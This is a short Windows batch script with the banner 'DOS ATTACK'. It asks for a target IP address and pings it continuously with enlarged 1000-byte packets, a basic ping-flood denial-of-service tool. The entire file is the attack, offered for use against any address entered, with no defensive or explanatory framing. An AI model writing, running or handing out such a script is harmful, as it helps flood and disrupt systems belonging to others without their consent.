@echo off 
color 0a 
echo --------------------------
echo     DOS ATTACK 
echo --------------------------
echo.
echo.
set /p IP=Target I.p:-
ping %IP% -t -l 1000
pause
